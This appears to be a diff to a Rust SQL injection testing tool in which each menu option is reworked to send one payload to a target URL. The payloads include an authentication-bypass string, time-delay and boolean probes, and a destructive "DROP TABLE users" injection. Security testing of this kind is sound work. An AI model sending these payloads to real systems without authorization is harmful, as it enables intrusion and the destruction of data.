@@ -8,39 +8,45 @@ pub async fn validation_exist_sql_injection(
 
     match payload {
         "1" => {
-            let set_payloads = vec!["' OR '1'='1", "'; DROP TABLE users; --"];
-
-            for set_payload in set_payloads {
-                if let Err(error) = response(client.clone(), url, set_payload).await {
-                    println!("Request error: {}", error);
-                }
+            let set_payload = "' OR '1'='1";
+            if let Err(error) = response(client.clone(), url, set_payload).await {
+                println!("Request error: {}", error);
             }
         },
         "2" => {
-            let set_payloads = vec!["'; WAITFOR DELAY '00:00:05'--"];
-
-            for set_payload in set_payloads {
-                if let Err(error) = response(client.clone(), url, set_payload).await {
-                    println!("Request error: {}", error);
-                }
+            let set_payload = "'; DROP TABLE users; --";
+            if let Err(error) = response(client.clone(), url, set_payload).await {
+                println!("Request error: {}", error);
             }
         },
         "3" => {
-            let set_payloads = vec!["' AND 1=1 --", "' AND 1=0 --"];
-
-            for set_payload in set_payloads {
-                if let Err(error) = response(client.clone(), url, set_payload).await {
-                    println!("Request error: {}", error);
-                }
+            let set_payload = "'; WAITFOR DELAY '00:00:05'--";
+            if let Err(error) = response(client.clone(), url, set_payload).await {
+                println!("Request error: {}", error);
             }
         },
         "4" => {
-            let set_payloads = vec!["' OR 1=1 --", "' OR 1=0 --"];
-
-            for set_payload in set_payloads {
-                if let Err(error) = response(client.clone(), url, set_payload).await {
-                    println!("Request error: {}", error);
-                }
+            let set_payload = "' AND 1=1 --";
+            if let Err(error) = response(client.clone(), url, set_payload).await {
+                println!("Request error: {}", error);
+            }
+        },
+        "5" => {
+            let set_payload = "' AND 1=0 --";
+            if let Err(error) = response(client.clone(), url, set_payload).await {
+                println!("Request error: {}", error);
+            }
+        },
+        "6" => {
+            let set_payload = "' OR 1=0 --";
+            if let Err(error) = response(client.clone(), url, set_payload).await {
+                println!("Request error: {}", error);
+            }
+        },
+        "7" => {
+            let set_payload = "' OR 1=1 --";
+            if let Err(error) = response(client.clone(), url, set_payload).await {
+                println!("Request error: {}", error);
             }
         }
         _ => println!("Options not found")
